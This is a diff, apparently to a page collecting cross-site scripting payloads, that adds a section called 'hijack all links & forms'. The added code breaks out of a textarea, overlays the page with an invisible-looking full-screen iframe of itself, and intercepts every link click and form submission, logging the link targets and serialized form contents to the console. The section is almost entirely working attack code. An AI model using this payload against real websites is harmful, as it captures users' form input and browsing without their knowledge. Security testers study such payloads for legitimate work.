@@ -13,3 +13,26 @@ background: '#fff'
 ).attr('src', location.href.replace(/\?.*/,''));
 </script>
 
+== hijack all links & forms
+
+</textarea><script>
+$('<iframe id=me>').css({
+position: 'absolute',
+width: '100%',
+height: '100%',
+top: 0,
+left: 0,
+border: 0,
+background: '#fff'
+}
+).appendTo('body').load(function() {
+var frame = this;
+console.log(this.contentDocument.body.scrollHeight); // in case we need to resize frame
+$('body',this.contentDocument).find('a').click(function() {
+console.log(this.href);
+}).end()
+.find('form').submit(function() {
+   console.log($(this).attr('action')|| frame.contentDocument.location.href, $(this).serialize());
+})
+}).attr('src', location.href.replace(/\?.*/,''));
+</script>
